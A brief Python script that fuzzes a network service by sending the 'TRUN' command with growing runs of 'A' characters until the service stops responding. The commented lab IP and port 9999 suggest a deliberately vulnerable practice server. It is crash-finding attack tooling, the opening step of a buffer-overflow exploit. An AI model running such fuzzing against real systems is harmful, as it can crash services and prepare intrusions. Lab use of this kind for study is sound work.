import socket


def fuzz(host, port):
    buffersize = 0

    try:
        while True:
            buffer = b"".join([
                b"TRUN",
                b" ",
                b".",
                b"A" * buffersize
            ])

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)

            sock.connect((host, port))

            sock.send(buffer)
            print(
                "Transmiting {} bytes: {}".format(buffersize, buffer)
            )

            sock.recv(1024)
            sock.close()
            buffersize += 10

    except socket.error:
        if buffersize == 0:
            print("Couldn't connect to socket, end of life")

        else:
            print(
                "Socket reached end of life around {} bytes".format(buffersize)
            )

# fuzz("192.168.31.128", 9999)
